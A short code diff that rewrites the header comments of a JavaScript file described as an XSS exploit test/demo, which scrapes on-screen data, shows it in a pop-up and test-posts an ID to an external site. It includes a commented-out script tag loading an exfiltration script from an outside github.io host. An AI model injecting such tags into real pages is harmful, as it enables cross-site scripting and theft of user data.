@@ -1,5 +1,13 @@
-//Authoer: JDL
-//<script src="https://jdl-84.github.io/CACHE-XSS/XSS.js"></script> 
+/**
+ * Summary. XSS Expoit Test/Demo.
+ *
+ * Description. Glean data from screen. Display in Pop-up. Test POST to External site. (ID only, not data).
+ *
+ * @author JDL-84
+ * @link https://jdl-84.github.io/CACHE-XSS/XSS.js
+ */
+
+//<script src='https://jdl-84.github.io/CACHE-XSS/SimpleExfiltrate.js'/>
 
 //Update Title for confirmation script loaded
 //We're not trying to be surreptitious about the app testing!
